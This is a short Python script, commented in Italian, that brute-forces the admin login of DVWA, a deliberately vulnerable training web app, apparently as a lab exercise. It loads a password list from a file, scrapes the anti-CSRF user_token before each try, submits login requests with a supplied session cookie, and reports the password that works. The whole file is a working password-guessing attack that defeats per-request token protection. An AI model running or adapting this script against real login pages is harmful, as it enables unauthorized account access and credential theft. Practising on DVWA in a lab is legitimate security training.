from sys import argv
import requests
import os

# variabili, parametri, ...
target = argv[1]  # IP di DVWA
phpsessid = argv[2]  # cookie di sessione
url_index = "http://" + target + "/DVWA/vulnerabilities/brute/index.php"
url_login = "http://" + target + "/DVWA/vulnerabilities/brute/index.php"

# leggere la lista delle password da un file
passwords = []
with open('psw.txt', 'r') as file:
    for line in file:
        passwords.append(line.strip())

# creare una sessione permanente
session = requests.session()
cookie = {'PHPSESSID': phpsessid, 'security': 'high'}

# debug della sessione
print("Impostazione del cookie di sessione: {}".format(cookie))

for p in passwords:
    # ottenere il token
    content = session.get(url_index, cookies=cookie)
    lines = content.text.splitlines()
    for line in lines:
        if 'user_token' in line:
            line = line.split("'")
            user_token = line[5]
    
    data = {'username': 'admin', 'password': p, 'Login': 'Login', 'user_token': user_token}
    test = session.get(url_login, cookies=cookie, params=data)
    res = test.text
    # print(res) #### solo per output di debug
    
    print("\033[1;35mTest-- \t password: {} \t token: {} \t cookie: {}\033[0m".format(p, user_token, cookie))

    if 'Username and/or password incorrect.' in res:
        print("\033[1;91mErrore: \t Nome utente e/o password errati.\033[0m")
        print("-" * 20)

    if 'Welcome to the password protected area admin' in res:
        print("\033[1;32mOttimo lavoro! La password corretta è \"{}\"\033[0m".format(p))
        print("-" * 20)